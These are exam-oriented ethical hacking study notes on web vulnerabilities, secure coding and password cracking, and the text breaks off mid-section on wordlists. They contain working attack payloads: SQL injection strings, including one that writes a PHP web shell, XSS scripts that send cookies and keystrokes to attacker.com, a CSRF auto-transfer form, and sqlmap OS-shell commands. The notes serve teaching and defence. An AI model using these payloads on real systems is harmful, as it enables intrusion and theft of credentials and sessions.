# Ethical Hacking Unit 4: Web Security and Password Cracking — Detailed Notes (SPPU Exam-Oriented)

---

## 4.1 Web Application Architecture — Components, Front-End, Back-End, and Security Concerns

### What is a Web Application?
A **web application** is a software program that runs on a **web server** and is accessed by users through a **web browser** over the internet. Unlike static websites, web applications are **interactive** and **dynamic** — they process user input, interact with databases, and generate content on the fly.

### Three-Tier Web Application Architecture

```
┌──────────────┐     ┌──────────────┐     ┌──────────────┐
│  Presentation │     │  Application │     │   Data       │
│  Layer (Tier 1)│────│  Layer (Tier 2)│────│  Layer (Tier 3)│
│  (Front-End)  │     │  (Back-End)  │     │  (Database)  │
└──────────────┘     └──────────────┘     └──────────────┘
```

| Layer | Component | Technology Examples | Role |
|-------|-----------|-------------------|------|
| **Tier 1 — Presentation** | Front-End | HTML, CSS, JavaScript, React, Angular, Vue.js | User interface, rendering, client-side logic |
| **Tier 2 — Application** | Back-End | PHP, Python (Django/Flask), Java (Spring), Node.js, Ruby on Rails, ASP.NET | Business logic, request processing, authentication, session management |
| **Tier 3 — Data** | Database | MySQL, PostgreSQL, MongoDB, Oracle, SQL Server | Data storage, retrieval, and management |

### Additional Components

| Component | Role | Security Concern |
|-----------|------|------------------|
| **Web Server** | Serves static content, routes requests | Apache, Nginx, IIS — misconfiguration, default pages |
| **Load Balancer** | Distributes traffic across servers | Cookie-based session affinity |
| **CDN** | Caches static assets globally | Cache poisoning |
| **WAF** | Web Application Firewall — filters malicious traffic | Bypass techniques |
| **Cache Layer** | Redis, Memcached — speeds up data access | Unauthorized access if unauthenticated |
| **API Gateway** | Manages API requests, rate limiting | API abuse, injection |

### HTTP Request-Response Cycle

```
Client (Browser)
    │
    ├── HTTP Request (GET /login HTTP/1.1)
    │     ├── Method (GET, POST, PUT, DELETE, etc.)
    │     ├── URL / Path
    │     ├── Headers (User-Agent, Cookie, Authorization, etc.)
    │     └── Body (POST data, JSON, form data)
    │
    ▼
Web Server ──→ Application Logic ──→ Database
    │
    ├── HTTP Response
    │     ├── Status Code (200 OK, 404 Not Found, 500 Server Error)
    │     ├── Headers (Set-Cookie, Content-Type, Server, etc.)
    │     └── Body (HTML, JSON, XML)
    │
    ▼
Client (Browser renders response)
```

### Security Concerns by Layer

| Layer | Security Concerns |
|-------|-------------------|
| **Front-End** | XSS, CSRF, Clickjacking, DOM-based vulnerabilities, Insecure localStorage |
| **Back-End** | SQL Injection, Command Injection, File Upload vulnerabilities, Authentication bypass, Session hijacking, Insecure Deserialization |
| **Database** | Weak encryption at rest, Excessive privileges, SQL Injection, Unencrypted backups |
| **Network** | MITM, DNS spoofing, SSL stripping, DDoS |
| **Infrastructure** | Unpatched server OS, Default credentials, Misconfigured permissions |

### OWASP Top 10 (Most Recent)
The **OWASP Top 10** is a standard awareness document listing the most critical web application security risks:

1. **Broken Access Control**
2. **Cryptographic Failures**
3. **Injection** (SQL, NoSQL, OS, LDAP)
4. **Insecure Design**
5. **Security Misconfiguration**
6. **Vulnerable and Outdated Components**
7. **Identification and Authentication Failures**
8. **Software and Data Integrity Failures**
9. **Security Logging and Monitoring Failures**
10. **Server-Side Request Forgery (SSRF)**

### SPPU Exam Tip
> For "Explain web application architecture with security concerns", draw the **three-tier architecture diagram**, label each layer with **technologies**, and list **at least 3 security concerns per layer**. Mention **OWASP Top 10**.

---

## 4.2 Web Application Vulnerabilities — SQL Injection, Cross-Site Scripting (XSS), CSRF

### 1. SQL Injection (SQLi)

**Definition**: SQL Injection is a code injection technique where an attacker inserts malicious SQL statements into an application's input fields to manipulate the backend database.

**How it Works**:
```
Normal Query:
  SELECT * FROM users WHERE username = 'john' AND password = 'pass123'

Malicious Input (username: admin' -- ):
  SELECT * FROM users WHERE username = 'admin' -- ' AND password = 'anything'
  ↑ Comment (-- ) ignores password check → Bypasses authentication!
```

**Types of SQL Injection**:

| Type | Description | Example |
|------|-------------|---------|
| **In-band SQLi (Error-based)** | Use error messages from database to extract information | `' AND 1=CONVERT(int, @@version) --` |
| **In-band SQLi (Union-based)** | Use UNION operator to combine results from multiple tables | `' UNION SELECT username, password FROM users --` |
| **Blind SQLi (Boolean-based)** | Infer information by observing true/false responses | `' AND SUBSTRING((SELECT db_name()),1,1)='m' --` (if true, page loads normally) |
| **Blind SQLi (Time-based)** | Infer information by observing response delays | `' IF (SELECT COUNT(*) FROM users) > 100 WAITFOR DELAY '0:0:5' --` |
| **Out-of-band SQLi** | Data exfiltrated through a different channel (DNS, HTTP request) | `' EXEC master..xp_dirtree '\\attacker.com\share' --` |

**SQL Injection Discovery**:

```bash
# Test input fields with special characters
'
"
'
--
'
#
' OR '1'='1
' OR 1=1 --
" OR 1=1 --
admin' --
admin' #
' UNION SELECT NULL --
```

**SQL Injection Exploitation**:
```sql
-- Bypass authentication
SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = 'anything'

-- Extract database version
' UNION SELECT @@version, NULL, NULL --

-- List tables (MySQL)
' UNION SELECT table_name, NULL FROM information_schema.tables --

-- Dump credentials
' UNION SELECT username, password FROM users --

-- Write a web shell
' UNION SELECT "<?php system($_GET['cmd']); ?>", NULL INTO OUTFILE '/var/www/html/shell.php' --
```

**SQL Injection Impact**:
- Authentication bypass
- Data theft (credentials, PII, financial data)
- Data modification/deletion
- Remote code execution (in some cases via `xp_cmdshell` or `INTO OUTFILE`)

**SQL Injection Mitigation**:
| Technique | Description |
|-----------|-------------|
| **Prepared Statements (Parameterized Queries)** | Most effective — separates SQL logic from data |
| **Stored Procedures** | Database-level parameterization |
| **Input Validation** | Whitelist allowed characters, reject suspicious input |
| **Least Privilege** | Database user should have minimum necessary permissions |
| **WAF** | Web Application Firewall with SQLi detection rules |
| **Escaping** | Escape special characters (less effective, not recommended alone) |

**Example — Prepared Statement (Secure)**:
```php
// VULNERABLE
$query = "SELECT * FROM users WHERE username = '$_POST[username]'";

// SECURE — Prepared Statement
$stmt = $conn->prepare("SELECT * FROM users WHERE username = ?");
$stmt->bind_param("s", $_POST['username']);
$stmt->execute();
```

### 2. Cross-Site Scripting (XSS)

**Definition**: XSS is a vulnerability that allows attackers to inject **malicious client-side scripts** into web pages viewed by other users. The injected script executes in the **victim's browser**, not on the server.

**Types of XSS**:

| Type | Description | Persistence | Example |
|------|-------------|------------|---------|
| **Stored (Persistent)** | Malicious script is permanently stored on the server (database, comment field, forum post) | Yes | Attacker posts `<script>alert('XSS')</script>` in a comment; every visitor executes it |
| **Reflected (Non-Persistent)** | Malicious script is part of the request and reflected in the response immediately | No | `https://example.com/search?q=<script>malicious.js</script>` — sent via phishing link |
| **DOM-Based** | Vulnerability exists entirely in client-side JavaScript (no server reflection) | No | Page reads `document.location.hash` or `document.URL` and writes it to DOM unsafely |

**XSS Impact**:
- Session hijacking (steal cookies)
- Phishing (fake login forms)
- Keylogging
- Defacement
- Malware download
- Bypassing CSRF protections

**XSS Payload Examples**:

```javascript
// Cookie theft
<script>fetch('https://attacker.com/steal?cookie=' + document.cookie)</script>

// Keylogger
<script>
document.onkeypress = function(e) {
    fetch('https://attacker.com/key?k=' + e.key);
}
</script>

// Redirect to phishing page
<script>window.location = 'https://attacker.com/fake-login';</script>

// Defacement
<script>document.body.innerHTML = '<h1>Hacked</h1>';</script>

// Load external script
<script src='https://attacker.com/evil.js'></script>

// No script tags (using event handlers)
<img src=x onerror=alert('XSS')>
<a href="javascript:alert('XSS')">Click me</a>
```

**XSS Mitigation**:

| Technique | Description |
|-----------|-------------|
| **Output Encoding** | Encode `<`, `>`, `"`, `'`, `&` to `&lt;`, `&gt;`, etc. |
| **Content Security Policy (CSP)** | Restrict which scripts can execute (whitelist sources) |
| **Input Validation** | Reject or sanitize HTML tags in user input |
| **HttpOnly Cookies** | JavaScript cannot access cookies with HttpOnly flag |
| **X-XSS-Protection Header** | Browser's built-in XSS filter (deprecated in modern browsers) |
| **DOMPurify** | Client-side sanitization library |

### 3. Cross-Site Request Forgery (CSRF / XSRF)

**Definition**: CSRF is an attack where a **logged-in victim** is tricked into executing **unwanted actions** on a web application without their knowledge or consent.

**How CSRF Works**:

```
1. Victim logs into bank.com (session cookie stored)
2. Victim visits attacker.com (while still logged in to bank.com)
3. attacker.com sends a forged request to bank.com/transfer?amount=10000&to=attacker
4. Browser automatically includes the victim's session cookie
5. Bank processes the transfer — thinks it's from the legitimate user!
```

**CSRF Example**:
```html
<!-- Attacker's page (attacker.com) -->
<img src="https://bank.com/transfer?amount=10000&to=attacker123" width="0" height="0">

<!-- Or auto-submitting form -->
<form action="https://bank.com/transfer" method="POST" id="csrf-form">
  <input type="hidden" name="amount" value="10000">
  <input type="hidden" name="to" value="attacker123">
</form>
<script>document.getElementById('csrf-form').submit();</script>
```

**CSRF Impact**:
- Unauthorized fund transfers
- Password/email changes
- Unauthorized purchases
- Privilege escalation (if admin is targeted)

**CSRF vs XSS**:

| Aspect | CSRF | XSS |
|--------|------|-----|
| **What it exploits** | Trust that a site has in a user's browser | Trust that a user has in a website |
| **Requires** | User to be authenticated | User to visit a vulnerable page |
| **Action** | Forges state-changing requests | Executes scripts in user's browser |
| **Cookie needed** | Yes (session-based) | No (can steal cookies) |
| **Mitigation** | CSRF tokens, SameSite cookies | Output encoding, CSP |

**CSRF Mitigation**:

| Technique | Description |
|-----------|-------------|
| **CSRF Token** | Unique, unpredictable token embedded in forms; validated server-side |
| **SameSite Cookie Attribute** | `Set-Cookie: session=abc; SameSite=Strict` — browser only sends cookie for same-site requests |
| **Referer/Origin Header Check** | Verify request comes from the same origin |
| **Re-authentication** | Confirm sensitive actions (password change, money transfer) with password |
| **Captcha** | Human verification for critical actions |
| **Custom Headers** | Require custom header (e.g., `X-Requested-By: XMLHttpRequest`) |

### SPPU Exam Tip
> For "Explain SQL Injection, XSS, and CSRF", define **each vulnerability**, show a **working example** (code snippet), explain **impact**, and list **mitigation techniques**. For SQLi, differentiate **4 types**. For XSS, differentiate **3 types**. Compare **CSRF vs XSS** in a table.

---

## 4.3 Web Application Security Measures — Input Validation, Authentication, and Secure Sessions

### 1. Input Validation

**Definition**: The process of ensuring that user-supplied data conforms to expected format, type, length, and range before processing it.

**Types of Input Validation**:

| Type | Description | Example |
|------|-------------|---------|
| **Whitelist (Allowlist)** | Accept only known-good values | Age: only digits 1–120 |
| **Blacklist (Denylist)** | Reject known-bad values | Reject `<script>`, `DROP TABLE` |
| **Format Validation** | Check against expected format | Email: `*@*.*` format |
| **Length Validation** | Restrict min/max length | Username: 3–20 characters |
| **Type Validation** | Check data type | Age should be integer |
| **Range Validation** | Check min/max values | Age 1–120 |

**Why Whitelist > Blacklist**: Blacklists can always be bypassed. Whitelists are stricter and more secure.

**Input Validation Locations**:

| Location | Pros | Cons |
|----------|------|------|
| **Client-Side (JavaScript)** | Instant feedback, reduces server load | Can be bypassed (disable JS, use Burp Suite) |
| **Server-Side** | Cannot be bypassed | Requires round trip |

**Rule**: **Always validate on the server side**. Client-side validation is for user experience only.

### 2. Authentication

**Definition**: The process of verifying the identity of a user, system, or entity.

**Authentication Factors**:

| Factor | Description | Examples |
|--------|-------------|----------|
| **Something you KNOW** | Knowledge factor | Password, PIN, security question |
| **Something you HAVE** | Possession factor | OTP token, smart card, phone (SMS), hardware key (YubiKey) |
| **Something you ARE** | Inherence factor | Fingerprint, facial recognition, iris scan, voice |
| **Something you DO** | Behavioral factor | Keystroke dynamics, mouse movement patterns |
| **Somewhere you ARE** | Location factor | Geolocation, IP-based restriction |

**Multi-Factor Authentication (MFA)**: Using 2+ factors from different categories.

**Authentication Best Practices**:

| Practice | Description |
|----------|-------------|
| **Strong Password Policy** | Minimum length, complexity, expiration |
| **Rate Limiting** | Lock account after N failed attempts (prevent brute-force) |
| **Account Lockout** | Temporary or permanent lockout after repeated failures |
| **CAPTCHA** | Prevent automated login attempts |
| **HTTPS** | Encrypt credentials in transit |
| **Password Hashing** | Store bcrypt/argon2, never plaintext or MD5 |
| **Session Timeout** | Auto-logout after inactivity |
| **Remember Me** | Use secure tokens, not storing password |
| **Password Reset** | Secure reset flow (email verification, security questions) |

**Common Authentication Attacks**:

| Attack | Description |
|--------|-------------|
| **Brute Force** | Try all possible password combinations |
| **Dictionary Attack** | Try common passwords from wordlist |
| **Credential Stuffing** | Use leaked credentials from other services |
| **Rainbow Table Attack** | Precomputed hash lookups (mitigated by salting) |
| **Phishing** | Trick user into revealing credentials |
| **Keylogging** | Capture keystrokes |
| **Session Hijacking** | Steal session token |
| **Man-in-the-Middle** | Intercept credentials in transit |

### 3. Secure Sessions

**Definition**: A session is a **stateful connection** between a user and a web application that persists across multiple HTTP requests (HTTP is stateless).

**Session Management Flow**:
```
1. User logs in → Server creates session
2. Server generates Session ID (random, unpredictable)
3. Session ID sent to browser via cookie (Set-Cookie header)
4. Browser sends Session ID with every subsequent request
5. Server looks up session data by Session ID
6. User logs out → Server destroys session
```

**Session ID Requirements**:
| Requirement | Description |
|-------------|-------------|
| **Unpredictability** | Must be cryptographically random (not sequential, not timestamp-based) |
| **Uniqueness** | No two users should get the same session ID |
| **Length** | Long enough to prevent brute-force (128+ bits) |
| **Expiration** | Must expire after timeout or logout |

**Session Attack Vectors**:

| Attack | Description | Mitigation |
|--------|-------------|------------|
| **Session Prediction** | Guess valid session IDs | Use cryptographically random IDs |
| **Session Fixation** | Attacker sets victim's session ID to a known value | Regenerate Session ID after login |
| **Session Hijacking** | Steal session ID (via XSS, network sniffing) | HttpOnly cookie, Secure flag, HTTPS |
| **Session Sidejacking** | Sniff session cookie over unencrypted Wi-Fi | Use HTTPS everywhere, Secure flag |

**Secure Cookie Attributes**:

| Attribute | Description | Example |
|-----------|-------------|---------|
| **Secure** | Cookie only sent over HTTPS | `Set-Cookie: session=abc; Secure` |
| **HttpOnly** | Cookie not accessible via JavaScript | `Set-Cookie: session=abc; HttpOnly` |
| **SameSite** | Restrict cookie to same-site requests | `SameSite=Strict` (most secure), `SameSite=Lax` (default) |
| **Domain** | Restrict cookie to specific domain | `Domain=example.com` |
| **Path** | Restrict cookie to specific path | `Path=/admin` |
| **Expires / Max-Age** | Cookie lifetime | `Max-Age=3600` |

### SPPU Exam Tip
> For "Explain web application security measures", cover **3 areas**: Input Validation (whitelist vs blacklist, server vs client), Authentication (3 factors, MFA, best practices), and Secure Sessions (session flow, ID requirements, cookie attributes, attack mitigations).

---

## 4.4 Web Application Penetration Testing — Identifying and Exploiting Web Vulnerabilities

### Web Application Penetration Testing Methodology

```
1. Information Gathering
2. Configuration & Deployment Testing
3. Identity Management Testing
4. Authentication Testing
5. Authorization Testing
6. Session Management Testing
7. Input Validation Testing
8. Error Handling Testing
9. Cryptography Testing
10. Business Logic Testing
11. Client-Side Testing
```

### Phase 1: Information Gathering

**Goal**: Understand the application's technology stack, functionality, and attack surface.

| Activity | Tools |
|----------|-------|
| Identify technologies (Wappalyzer, BuiltWith) | Browser extensions |
| Discover hidden files/directories | **Gobuster**, **dirb**, **ffuf** |
| Spider/crawl the application | **Burp Suite Spider**, **ZAP Spider**, **Scrapy** |
| Analyze robots.txt, sitemap.xml | Manual inspection |
| Identify subdomains | **Sublist3r**, **Amass** |
| Google dorking | Site-specific search |

```bash
# Directory enumeration
gobuster dir -u https://example.com -w /usr/share/wordlists/dirb/common.txt

# Subdomain enumeration
sublist3r -d example.com
```

### Phase 2: Configuration & Deployment Testing

| Check | Description |
|-------|-------------|
| Default credentials | admin/admin, root/root |
| Directory listing | Enabled on /uploads/, /backup/ |
| HTTP methods | TRACE, PUT, DELETE enabled? |
| Server headers | Information leakage (Server: Apache/2.4.1) |
| Outdated software | Check version numbers against CVE databases |
| Error handling | Stack traces exposed? |

### Phase 3: Authentication Testing

| Test | Description |
|------|-------------|
| Username enumeration | Different error messages for valid/invalid usernames |
| Password policy | Minimum length, complexity requirements |
| Brute-force protection | Rate limiting, account lockout |
| Remember me functionality | Is token predictable? |
| Password reset | Can attacker reset someone else's password? |

### Phase 4: Input Validation Testing

| Test | Description | Example Payload |
|------|-------------|----------------|
| **SQL Injection** | Inject SQL via input fields | `' OR 1=1 --` |
| **XSS** | Inject JavaScript via input fields | `<script>alert(1)</script>` |
| **Command Injection** | Inject OS commands | `; ls -la` |
| **LDAP Injection** | Manipulate LDAP queries | `admin)(uid=*` |
| **NoSQL Injection** | Inject NoSQL operators | `{"$gt": ""}` |
| **XXE** | XML External Entity injection | `<!ENTITY xxe SYSTEM "file:///etc/passwd">` |
| **SSTI** | Server-Side Template Injection | `{{7*7}}`, `${7*7}` |
| **File Upload** | Upload malicious files | `.php`, `.asp`, `.war` files |

### Phase 5: Session Management Testing

| Test | Description |
|------|-------------|
| Session ID randomness | Decode/analyze session tokens (Base64, timestamp, sequential?) |
| Session fixation | Can attacker set victim's session ID? |
| CSRF | Missing CSRF tokens on sensitive forms |
| Cookie attributes | Secure, HttpOnly, SameSite flags missing? |

### Phase 6: Authorization Testing

| Test | Description |
|------|-------------|
| **Horizontal Privilege Escalation** | User A can access User B's data (change ID in URL) |
| **Vertical Privilege Escalation** | Regular user can access admin pages |
| **IDOR (Insecure Direct Object Reference)** | `https://example.com/invoice?id=123` — try `id=124` |

### Tools for Web Penetration Testing

| Tool | Purpose |
|------|---------|
| **Burp Suite** | Intercepting proxy, scanner, repeater, intruder |
| **OWASP ZAP** | Open-source web scanner |
| **Nikto** | Web server scanner |
| **SQLmap** | Automated SQL injection exploitation |
| **XSStrike** | Advanced XSS detection |
| **WFuzz / ffuf** | Web fuzzing |
| **Gobuster / dirb** | Directory/file brute-forcing |
| **Metasploit** | Web exploit modules |

### Practical SQL Injection with SQLmap

```bash
# Detect SQL injection
sqlmap -u "https://example.com/page?id=1"

# Enumerate databases
sqlmap -u "https://example.com/page?id=1" --dbs

# Enumerate tables from a database
sqlmap -u "https://example.com/page?id=1" -D database_name --tables

# Dump table data
sqlmap -u "https://example.com/page?id=1" -D database_name -T users --dump

# Get OS shell (if DB has xp_cmdshell or similar)
sqlmap -u "https://example.com/page?id=1" --os-shell
```

### Practical XSS Testing with Burp Suite

```
1. Set browser proxy to 127.0.0.1:8080
2. Navigate to target application
3. Identify input fields (search, comment, contact form)
4. Test each field with XSS payloads
5. Check if payload executes in browser
6. If Stored XSS: check if other users see the payload
7. Try to steal cookies: document.cookie
```

### SPPU Exam Tip
> For "Explain web application penetration testing", describe the **methodology phases** (Information Gathering → Configuration → Authentication → Input Validation → Session → Authorization), mention **tools for each phase**, and show **practical examples** (SQLmap for SQLi, Burp Suite for XSS).

---

## 4.5 Secure Coding Practices — Preventing Security Flaws in Web Applications

### OWASP Secure Coding Principles

| Principle | Description |
|-----------|-------------|
| **Minimize Attack Surface** | Disable unnecessary features, remove debug code, reduce exposed functionality |
| **Defense in Depth** | Multiple layers of security (no single point of failure) |
| **Least Privilege** | Code runs with minimum necessary permissions |
| **Secure Defaults** | Default configuration should be secure (not "configure later") |
| **Fail Securely** | On error, deny access by default |
| **Never Trust User Input** | All input is untrusted until validated |
| **Separation of Duties** | Different users/processes for different tasks |
| **Security by Design** | Security considered from design phase, not as an afterthought |

### Language-Specific Secure Coding Practices

#### PHP
```php
// VULNERABLE
$query = "SELECT * FROM users WHERE id = $_GET[id]";
eval("echo " . $_POST['code'] . ";");

// SECURE
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = :id");
$stmt->execute(['id' => $_GET['id']]);
```

#### Python (Django/Flask)
```python
# VULNERABLE — Using string formatting for SQL
query = f"SELECT * FROM users WHERE id = {request.GET['id']}"

# SECURE — Django ORM
User.objects.filter(id=request.GET['id'])

# SECURE — Parameterized query
cursor.execute("SELECT * FROM users WHERE id = %s", [request.GET['id']])
```

#### Java (Spring)
```java
// VULNERABLE
String query = "SELECT * FROM users WHERE id = " + request.getParameter("id");

// SECURE — PreparedStatement
PreparedStatement stmt = conn.prepareStatement("SELECT * FROM users WHERE id = ?");
stmt.setString(1, request.getParameter("id"));
```

#### Node.js (Express)
```javascript
// VULNERABLE
const query = `SELECT * FROM users WHERE id = ${req.query.id}`;

// SECURE — Parameterized query
db.query('SELECT * FROM users WHERE id = ?', [req.query.id]);

// VULNERABLE — EJS template injection
res.render('page', { userInput: req.query.input });

// SECURE — Escape output
<%= userInput %>   <!-- Escaped -->
<%- userInput %>   <!-- Raw (dangerous!) -->
```

### Input Validation Patterns

```python
# Whitelist validation
import re
def validate_username(username):
    if re.match(r'^[a-zA-Z0-9_]{3,20}$', username):
        return username
    raise ValueError("Invalid username")

# Type validation
def validate_age(age):
    age = int(age)  # Ensure integer
    if 0 < age < 150:
        return age
    raise ValueError("Invalid age")
```

### Output Encoding (Preventing XSS)

| Context | Encoding | Example |
|---------|----------|---------|
| **HTML Body** | Convert `<` to `&lt;`, `>` to `&gt;` | `&lt;script&gt;` |
| **HTML Attribute** | Encode quotes and special chars | `onclick="..."` |
| **JavaScript String** | Escape `\`, `'`, `"` | `\x3Cscript\x3E` |
| **URL Parameter** | URL-encode special chars | `%3Cscript%3E` |
| **CSS** | Encode hex values | `\3C script\3E` |

### Secure Database Access

```python
# Always use parameterized queries
cursor.execute("SELECT * FROM products WHERE category = %s AND price < %s",
               [category, max_price])

# ORM (Object-Relational Mapping) — safer by default
Product.objects.filter(category=category, price__lt=max_price)
```

### Authentication & Password Storage

```python
# NEVER store plaintext passwords
# NEVER use MD5 or SHA-1 for passwords
# ALWAYS use bcrypt, scrypt, or argon2

import bcrypt

# Hashing
password = b"user_password"
salt = bcrypt.gensalt()
hashed = bcrypt.hashpw(password, salt)

# Verification
if bcrypt.checkpw(input_password, stored_hash):
    print("Login successful")
```

### File Upload Security

```python
# VULNERABLE — No validation
file.save("uploads/" + file.filename)

# SECURE validation
ALLOWED_EXTENSIONS = {'pdf', 'png', 'jpg', 'jpeg', 'gif'}
MAX_FILE_SIZE = 5 * 1024 * 1024  # 5MB

def validate_file(file):
    # 1. Check extension
    ext = file.filename.split('.')[-1].lower()
    if ext not in ALLOWED_EXTENSIONS:
        raise ValueError("Invalid file type")

    # 2. Check content type (MIME)
    if file.content_type not in ['image/jpeg', 'image/png', 'application/pdf']:
        raise ValueError("Invalid MIME type")

    # 3. Check file size
    if len(file.read()) > MAX_FILE_SIZE:
        raise ValueError("File too large")

    # 4. Rename file (prevent path traversal)
    import uuid
    safe_filename = str(uuid.uuid4()) + "." + ext

    # 5. Store outside webroot
    file.save(os.path.join(UPLOAD_DIR, safe_filename))
```

### Session Management

```python
# Flask secure session configuration
app.config.update(
    SECRET_KEY='your-secret-key',      # Cryptographically random
    SESSION_COOKIE_SECURE=True,         # HTTPS only
    SESSION_COOKIE_HTTPONLY=True,       # No JavaScript access
    SESSION_COOKIE_SAMESITE='Lax',      # CSRF protection
    PERMANENT_SESSION_LIFETIME=3600,    # 1 hour timeout
)

# Regenerate session ID after login
session.regenerate()

# Destroy session on logout
session.clear()
```

### Security Headers

```python
# Recommended HTTP security headers
response.headers['Content-Security-Policy'] = "default-src 'self'"
response.headers['X-Frame-Options'] = 'DENY'           # Clickjacking
response.headers['X-Content-Type-Options'] = 'nosniff'  # MIME sniffing
response.headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains'
response.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'
response.headers['Permissions-Policy'] = 'geolocation=()'
```

### Secure Coding Checklist

| Category | Check |
|----------|-------|
| **Input** | All input validated (whitelist approach) |
| | No direct use of user input in SQL/commands |
| | File uploads validated (extension, size, content) |
| **Output** | All output encoded for context |
| | Error messages do not reveal stack traces |
| **Authentication** | Passwords hashed with bcrypt/argon2 |
| | Session IDs regenerated after login |
| | Rate limiting on login endpoint |
| **Database** | Parameterized queries everywhere |
| | Least privilege DB user |
| **Configuration** | Debug mode disabled in production |
| | Security headers set |
| | HTTPS enforced |
| **Dependencies** | Libraries updated (no known CVEs) |
| | No default credentials |

### SPPU Exam Tip
> For "Explain secure coding practices", mention **OWASP principles** (minimize attack surface, defense in depth, least privilege), show **code examples** (vulnerable vs secure) for at least **3 languages**, cover **input validation, output encoding, password storage, file upload**, and provide a **checklist**.

---

## 4.6 Understanding Password Hashes & Cracking Techniques — Hash Types, Salting, and Security Risks

### What is Password Hashing?
**Hashing** is a **one-way** function that converts a password into a fixed-length string. Unlike encryption, hashing **cannot be reversed** — the only way to "crack" a hash is to guess the input and see if it produces the same hash.

### Common Hash Types

| Hash Type | Output Size | Status | Used By |
|-----------|-------------|--------|---------|
| **MD5** | 128 bits (32 hex chars) | **Broken** (instant collisions) | Legacy systems |
| **SHA-1** | 160 bits (40 hex chars) | **Broken** (SHAttered 2017) | Legacy systems, Git |
| **SHA-256** | 256 bits (64 hex chars) | Secure | Linux (shadow), SSL/TLS |
| **SHA-512** | 512 bits (128 hex chars) | Secure | Linux (shadow) |
| **NTLM** | 128 bits (32 hex chars) | Weak | Windows (local SAM) |
| **LM Hash** | 2 × 56-bit halves | **Very weak** | Windows (legacy) |
| **bcrypt** | Variable | Secure | Web applications |
| **scrypt** | Variable | Secure (memory-hard) | Cryptocurrency wallets |
| **argon2** | Variable | **Most secure** (PHC winner) | Modern apps |

### Where Password Hashes Are Found

| Source | Location | Hash Type | How to Access |
|--------|----------|-----------|---------------|
| **Linux /etc/shadow** | `/etc/shadow` | SHA-512 ($6$), SHA-256 ($5$), bcrypt | Root access required |
| **Windows SAM** | `C:\Windows\System32\config\SAM` | NTLM, LM | SYSTEM privileges or offline |
| **Windows NTDS.dit** | Domain controller | NTLM | Domain admin or Volume Shadow Copy |
| **Web App DB** | Users table | bcrypt, MD5, SHA-1 (varies) | SQL injection, DB access |
| **Wi-Fi (WPA/WPA2)** | Handshake capture (4-way handshake) | PBKDF2-SHA1 | Packet capture |
| **ZIP/RAR/PDF** | Encrypted file header | Various | File itself |

### Understanding Hash Formats

```
Linux shadow file format:
  username:$6$salt$hashed_password:last_change:min:max:warn:inactive:expire

$6$sXi7PgKr$StLmFuB...   ← SHA-512 ($6$), salt = sXi7PgKr
$5$salt$hash              ← SHA-256 ($5$)
$2y$10$salt$hash          ← bcrypt ($2y$)

Windows NTLM example:
  admin:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
  ↑       ↑    └─ LM Hash (empty = no LM) ──┘└───────── NTLM Hash ───────────┘
  Username  RID
```

### Salting

**Definition**: A **salt** is a random, unique value appended to a password before hashing. Each user gets a different salt.

**Why Salt Matters**:

```
Without Salt:
  password "hello123" → MD5("hello123") = f30aa7a662c728b7407c54ae6bfd27d1
  Same password = Same hash for all users!

With Salt:
  User A: MD5("hello123" + "aB3xZ9") = 8f2a...
  User B: MD5("hello123" + "kL7pQ2") = 4c1b...
  Same password = Different hash!
```

| Aspect | Without Salt | With Salt |
|--------|-------------|-----------|
| **Identical passwords** | Same hash — immediately visible | Different hashes |
| **Rainbow table** | Effective (precomputed for all words) | **Ineffective** (table would need to cover all salts too) |
| **Time to crack all users** | Hash once, compare against all | Must hash each password × salt for each user |
| **Cracking speed** | Fast (parallel comparison) | Slower (unique hash per user) |

### Password Cracking Techniques

| Technique | Description | Speed | Effectiveness |
|-----------|-------------|-------|---------------|
| **Brute Force** | Try every possible character combination | Very slow | 100% (given enough time) |
| **Dictionary Attack** | Try words from a wordlist (common passwords) | Fast | High (most passwords are weak) |
| **Hybrid Attack** | Dictionary word + variations (append numbers/symbols) | Moderate | Very high |
| **Rainbow Table** | Precomputed hash → password lookup | Instant | Defeated by salting |
| **Rule-Based Attack** | Apply transformation rules to base words | Moderate | Very high (John rule engine) |
| **Mask Attack** | Known pattern (e.g., 8 chars, starts with capital, ends with digit) | Moderate | When password pattern known |
| **Combinator Attack** | Combine two words from wordlist | Slow | Good for passphrases |

### Cracking Speed Estimates (Hashcat benchmarks — RTX 4090)

| Hash Type | Speed (hashes/sec) | 8-char password |
|-----------|-------------------|-----------------|
| **MD5** | ~200 GH/s | Seconds |
| **SHA-1** | ~80 GH/s | Minutes |
| **SHA-256** | ~30 GH/s | Hours |
| **SHA-512** | ~8 GH/s | Days |
| **NTLM** | ~300 GH/s | Seconds |
| **bcrypt** (cost 5) | ~200 KH/s | Years |
| **bcrypt** (cost 10) | ~10 KH/s | Centuries |
| **scrypt** | ~100 KH/s | Centuries |
| **argon2** | ~5 KH/s | Millennia |

### SPPU Exam Tip
> For "Explain password hashes and cracking techniques", define **hashing vs encryption**, list **hash types** with their status (MD5 broken, SHA-256 secure, bcrypt/argon2 recommended), explain **salting** with a diagram/example, and describe **cracking techniques** (dictionary, brute force, rainbow table, hybrid, mask).

---

## 4.7 Wordlists & Attack Strategies — Custom Wordlists, Brute Force vs Dictionary Attacks

### What is a Wordlist?
A **wordlist** (or dictionary) is a file containing a list of potential passwords, one per line. The quality of a wordlist directly impacts the success rate of password cracking.

### Common Wordlists

| Wordlist | Location (Kali) | Size | Description |
|----------|----------------|------|-------------|
| **rockyou.txt** | `/usr/share/wordlists/rockyou.txt.gz` | ~14 GB (extracted) | Most famous — 14 million real leaked passwords from RockYou breach (2009) |
| **SecLists** | `/usr/share/seclists/` | ~10 GB | Comprehensive collection by Daniel Miessler |
| **Common Passwords** | `/usr/share/wordlists/` | Various | Built-in lists in Kali |
| **CrackStation** | Online download | ~15 GB | Password cracking dictionary |
| **Probable Wordlists** | Online download | Various | Password probability-based lists |

### Creating Custom Wordlists

#### 1. CeWL — Custom Word List Generator

**CeWL** (Custom Word List) spiders a website and generates a wordlist from its content.

```bash
# Generate wordlist from website
cewl https://example.com -w custom_words.txt

# Minimum word length, depth, and other options
cewl https://example.com -m 6 -d 2 -w words.txt

# With email extraction
cewl https://example.com -e --email_file emails.txt
```

#### 2. Crunch — Generate Wordlist by Pattern

**Crunch** generates all possible combinations based on a pattern.

```bash
# Generate all 8-character passwords (lowercase)
crunch 8 8 abcdefghijklmnopqrstuvwxyz -o passwords.txt

